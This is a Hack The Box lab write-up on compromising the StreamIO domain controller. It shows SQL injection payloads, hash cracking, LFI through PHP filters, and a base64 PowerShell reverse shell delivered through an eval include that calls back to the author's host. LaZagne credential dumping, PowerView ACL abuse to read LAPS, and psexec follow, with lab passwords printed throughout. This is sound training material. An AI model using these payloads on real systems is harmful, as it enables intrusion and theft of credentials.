# HTB - StreamIO

#### Ip: 10.10.11.158
#### Name: StreamIO
#### Rating: Medium

----------------------------------------------------------------------

StreamIO.png

### Enumeration

I'll begin enumerating this box by scanning all TCP ports with Nmap and use the `--min-rate 10000` flag to speed things up. I'll also use the `-sC` and `-sV` to use basic Nmap scripts and to enumerate versions:

```
┌──(ryan㉿kali)-[~/HTB/StreamIO]
└─$ sudo nmap -p- --min-rate 10000 -sC -sV 10.10.11.158
Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-15 08:54 CST
Nmap scan report for 10.10.11.158
Host is up (0.080s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-02-15 21:54:31Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Not valid before: 2022-02-22T07:03:28
|_Not valid after:  2022-03-24T07:03:28
|_http-title: Not Found
|_ssl-date: 2024-02-15T21:56:03+00:00; +7h00m01s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49726/tcp open  msrpc         Microsoft Windows RPC
55144/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 6h59m59s
| smb2-time: 
|   date: 2024-02-15T21:55:25
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 113.21 seconds
```

Looking through the nmap results we can assume this target is a domain controller based on DNS, LDAP, Kerberos, etc being open.

Lets add streamIO.htb to our `/etc/hosts` file.

Port 80 is a default IIS landing page, and directory fuzzing didn't turn up anything of interest for me.

Port 443 however is hosting a movie streaming site:

streamio_443.png

After enumerating the site and not finding much of value, I fuzzed for vhosts and found watch.streamIO.htb.

```
┌──(ryan㉿kali)-[~/HTB/StreamIO]
└─$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "https://streamIO.htb" -H "Host: FUZZ.streamIO.htb" --hw 55 --hc 404    
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://streamIO.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                     
=====================================================================

000002268:   200        78 L     245 W      2829 Ch     "watch"                                                     

Total time: 0
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 0
```

Lets add that to `/etc/hosts` as well and navigate to the site.

streamio_watch.png

Kicking off some directory scanning against the vhost we find a search.php page:

```
┌──(ryan㉿kali)-[~/HTB/StreamIO]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://watch.streamIO.htb -x txt,asp,aspx,php -t 50 -k
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://watch.streamIO.htb
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              txt,asp,aspx,php
[+] Timeout:                 10s
===============================================================
2024/02/15 09:28:21 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 2829]
/search.php           (Status: 200) [Size: 253887]
/static               (Status: 301) [Size: 157] [--> https://watch.streamIO.htb/static/]
/Search.php           (Status: 200) [Size: 253887]
```

streamio_search_page.png

Clicking "watch" to stream a movie we get the following error:

streamio_security_error.png

Interesting.

Beginning to test the search function for a possible SQL injection we get redirected to /blocked.php

streamio_blocked.png

Seems like were on the right path here. And thankfully we are able to go back to the search page and resume searching/ testing without actually being blocked.

Continuing testing we can begin trying UNION injections.

Starting with:

```
cn' UNION select 1-- -	
```

I can keep adding numbers to determine the number of columns:

I can tell the table has 6 columns because the following gets me a new unexpected result:

```
cn' UNION select 1,2,3,4,5,6-- -	
```
Now that we have this knowledge we can check the version with:

```
cn' UNION select 1,@@version,3,4,5,6-- -	
```

streamio_version.png


Lets now look at the databases:

```
cn' UNION select 1,name,3,4,5,6 from master..sysdatabases-- -
```

streamio_databases.png

Lets look at the tables from STREAMIO
```
cn' UNION select 1,name,3,4,5,6 from STREAMIO..sysobjects WHERE xtype = 'U'-- -
```
streamio_users_table.png


We can check the column names with:
```
cn' UNION select 1,name,3,4,5,6 from STREAMIO..syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'Users')-- -
```

streamio_column_names.png

Lets now grab the usernames:
```
cn' UNION select 1,username,3,4,5,6 from STREAMIO..Users-- -
```

streamio_usernames.png

And passwords:
```
cn' UNION select 1,password,3,4,5,6 from STREAMIO..Users-- -
```

streamio_password_hashes.png

Cool, so it looks like we've got about 30 usernames and hashes. Lets see if we can crack these hashes using hashcat:

streamio_hashcat.png

I'll copy that into a file called hash_mess and use `awk` to isolate the passwords

```
┌──(ryan㉿kali)-[~/HTB/StreamIO]
└─$ cat hash_mess | awk -F ":" '{print $2}' > passwords.txt
                                                                                                                             
┌──(ryan㉿kali)-[~/HTB/StreamIO]
└─$ cat passwords.txt                                      
##123a8j8w5123##
$monique$1991$
highschoolmusical
password123
$hadoW
password
paddpadd
$3xybitch
!5psycho8!
66boysandgirls..
!?Love?!123
physics69i
%$clara
!!sabrina$
```

After doing a bit of spraying and not finding anything off the bat, I decided to validate the usernames and see if they were valid names on the domain. We can use Kerbrute userenum for this:

streamio_kerbrute.png

Ok, so it looks like only yoshihide is a valid domain user.

Unable to authenticate to any other services I turn back to the website and spray my password list with yoshihide to see if I can login:

streamio_site_hydra.png

Nice, that worked. We can login with `yoshihide:66boysandgirls..`

once logged in we can head to https://streamio.htb/admin/ and find a dashboard:

streamio_admin_panel.png

Clicking on the "User Management" button we are redirected to: https://streamio.htb/admin/?user=

This seems like its worth testing for LFI.

Lets try fuzzing out more parameters:

streamio_cookie_fuzz.png

Nice, looks like we found an extra parameter: debug.

We can use PHP wrappers to base64 encode and retrieve index.php

```
https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=index.php
```

decoding the output in the terminal we find a DB password:

```php
<?php
define('included',true);
session_start();
if(!isset($_SESSION['admin']))
{
	header('HTTP/1.1 403 Forbidden');
	die("<h1>FORBIDDEN</h1>");
}
$connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
$handle = sqlsrv_connect('(local)',$connection);

?>
```

Still not sure what to do with these credentials, as we have no access to a DB, I decided to fuzz the LFI a bit more to see if there was anything else juicy.

Running:
```
┌──(ryan㉿kali)-[~/HTB/StreamIO]
└─$ wfuzz -c -b PHPSESSID=9ncmmu4vrk3lctg29d9rb5a9d4 --hh 1712 -u 'https://streamio.htb/admin/?debug=FUZZ' -w /usr/share/seclists/Discovery/Web-Content/Common-PHP-Filenames.txt
``` 

Reveals a master.php file. Lets use PHP wrappers to base64 encode it, and then decode in the terminal.

And at the very end of the file we see some PHP using `eval`:

```php
<?php
if(isset($_POST['include']))
{
if($_POST['include'] !== "index.php" ) 
eval(file_get_contents($_POST['include']));
else
echo(" ---- ERROR ---- ");
}
?>
```

So, knowing this, we should be able to make a POST request, set the include field, which should execute with `eval` and get a reverse shell on the target.

### Exploitation

First I'll grab a bas64 encoded Powershell reverse shell from revshell.com, and copy it into a `system` command in a PHP script call shell.php:

```php    
system('powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANwA4ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=');
```

Then I can grab the PHPSESSID cookie and make a POST request using curl:

```
curl --insecure -b "PHPSESSID=n4cdkptkj1c7sbec67a54p1tdu" -X POST --data "include=http://10.10.14.78/shell.php" https://streamio.htb/admin/index.php\?debug\=master.php
```

Nice, we've got our shell back!

```
┌──(ryan㉿kali)-[~/HTB/StreamIO]
└─$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.78] from (UNKNOWN) [10.10.11.158] 59706
whoami
streamio\yoshihide
PS C:\inetpub\streamio.htb\admin> hostname
DC
```

Not initially seeing much of interest I recalled we had already discovered some DB credentials that we were never able to use. db_admin:B1@hx31234567890.

Lets use these credentials to enumerate the DB:

```
PS C:\temp> sqlcmd -H localhost -U db_admin -P 'B1@hx31234567890' -Q 'select name from master.dbo.sysdatabases'
name                                                                                                                            
--------------------------------------------------------------------------------------------------------------------------------
master                                                                                                                          
tempdb                                                                                                                          
model                                                                                                                           
msdb                                                                                                                            
STREAMIO                                                                                                                        
streamio_backup 
```

streamio_backup seems interesting.

```
PS C:\temp> sqlcmd -H localhost -U db_admin -P 'B1@hx31234567890' -Q 'select table_name from streamio_backup.information_schema.tables'
table_name                                                                                                                      
--------------------------------------------------------------------------------------------------------------------------------
movies                                                                                                                          
users                                                                                                                           

(2 rows affected)
```

Lets check out the users table:
```
PS C:\temp> sqlcmd -H localhost -U db_admin -P 'B1@hx31234567890' -Q 'USE streamio_backup; select * from users'
Changed database context to 'streamio_backup'.
id          username                                           password                                          
----------- -------------------------------------------------- --------------------------------------------------
          1 nikk37                                             389d14cb8e4e9b94b137deb1caf0612a                  
          2 yoshihide                                          b779ba15cedfd22a023c4d8bcf5f2332                  
          3 James                                              c660060492d9edcaa8332d89c99c9239                  
          4 Theodore                                           925e5408ecb67aea449373d668b7359e                  
          5 Samantha                                           083ffae904143c4796e464dac33c1f7d                  
          6 Lauren                                             08344b85b329d7efd611b7a7743e8a09                  
          7 William                                            d62be0dc82071bccc1322d64ec5b6c51                  
          8 Sabrina                                            f87d3c0d6c8fd686aacc6627f1f493a5                  

(8 rows affected)
```

The nikk37 user is interesting because we can confirm the are a valid domain user:

```
PS C:\temp> net users /domain

User accounts for \\DC

-------------------------------------------------------------------------------
Administrator            Guest                    JDgodd                   
krbtgt                   Martin                   nikk37                   
yoshihide                
The command completed successfully.
```

Dropping the hash in crackstation we can succesfully crack it:

streamio_crack_nikk37.png

We can now login using evil-winrm as user nikk37:

```
┌──(ryan㉿kali)-[~/HTB/StreamIO]
└─$ evil-winrm -i streamIO.htb -u nikk37 -p 'get_dem_girls2@yahoo.com'         

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\nikk37\Documents> whoami
streamio\nikk37
```

And grab the user.txt flag:

streamio_user_flag.png

### Privilege Escalation

Not seeing much of interest on the target I uploaded LaZagne.exe to see if we could discover any passwords, and luckily we did:

```
*Evil-WinRM* PS C:\temp> ./LaZagne.exe all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|


########## User: nikk37 ##########

------------------- Firefox passwords -----------------

[+] Password found !!!
URL: https://slack.streamio.htb
Login: yoshihide
Password: paddpadd@12

[+] Password found !!!
URL: https://slack.streamio.htb
Login: admin
Password: JDg0dd1s@d0p3cr3@t0r

[+] Password found !!!
URL: https://slack.streamio.htb
Login: nikk37
Password: n1kk1sd0p3t00:)

[+] Password found !!!
URL: https://slack.streamio.htb
Login: JDgodd
Password: password@12


[+] 4 passwords have been found.
```

Nice. Lets update our users and passwords list and try some spraying.

```
┌──(ryan㉿kali)-[~/HTB/StreamIO]
└─$ crackmapexec smb streamIO.htb -u users.txt -p passwords.txt --continue-on-success | grep [+]
SMB         streamIO.htb    445    DC               [+] streamIO.htb\nikk37:get_dem_girls2@yahoo.com 
SMB         streamIO.htb    445    DC               [+] streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r
```

Cool looks like user JDgodd is also valid.

Going back to the target, I load SharpHound.exe to ingest some data on the domain I can use with BloodHound.

```
*Evil-WinRM* PS C:\temp> upload ~/Tools/AD/SharpHound.exe
Info: Uploading ~/Tools/AD/SharpHound.exe to C:\temp\SharpHound.exe

                                                             
Data: 1402196 bytes of 1402196 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\temp> ./Sharphound.exe
```

Loading the results into BloodHound, I can mark both nikk37 and JDgodd "owned" and inspect their roles and permissions.

Looking closely at JDgodd's control permissions, we see they have WriteOwner controll over the "core staff" group. 

streamio_jdgodd_perms.png

And in turn, if we look at the core staff group control permissions, we see members have the ability to ReadLAPSPassword. Interesting. This is likely our attack path.

streamio_corestaff.png

Trying to read LAPS as JDgodd and we get access denied and no password returned.. 

```
┌──(ryan㉿kali)-[~/HTB/StreamIO]
└─$ crackmapexec smb streamIO.htb -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' --laps
SMB         streamIO.htb    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
SMB         streamIO.htb    445    DC               [-] streamIO.htb\administrator: STATUS_LOGON_FAILURE
```

Maybe even though they are owner of the group, they are not an actual member of the group? Lets try adding them to the group.

Back in our shell lets load PowerView.ps1 up.

Now we can add JDgodd to the Core Staff Group. First we'll need to set up some credentials:

```
*Evil-WinRM* PS C:\temp> Import-Module .\PowerView.ps1
*Evil-WinRM* PS C:\temp> $pass = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force 
*Evil-WinRM* PS C:\temp> $cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $pass)
```

Then we can add them to the group:

```
*Evil-WinRM* PS C:\temp> Add-DomainObjectAcl -Credential $cred -TargetIdentity "Core Staff" -PrincipalIdentity "streamio\JDgodd"
*Evil-WinRM* PS C:\temp> Add-DomainGroupMember -Credential $cred -Identity "Core Staff" -Members "StreamIO\JDgodd"
```

Now when we attempt to read the LAPS password using CME, we get a result back:

```
┌──(ryan㉿kali)-[~/HTB/StreamIO]
└─$ crackmapexec smb streamIO.htb -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' --laps
SMB         streamIO.htb    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
SMB         streamIO.htb    445    DC               [-] DC\administrator:6!$n]8(D1N#I{Y STATUS_LOGON_FAILURE 
```

We can then take these credentials and logon as the admin:

```
┌──(ryan㉿kali)-[~/HTB/StreamIO]
└─$ impacket-psexec administrator@10.10.11.158
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.11.158.....
[*] Found writable share ADMIN$
[*] Uploading file uKdchxNn.exe
[*] Opening SVCManager on 10.10.11.158.....
[*] Creating service mkvS on 10.10.11.158.....
[*] Starting service mkvS.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2928]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
DC
```

And grab the final flag:

streamio_root_flag.png

Thanks for following along! 

-Ryan

----------------------------------------------------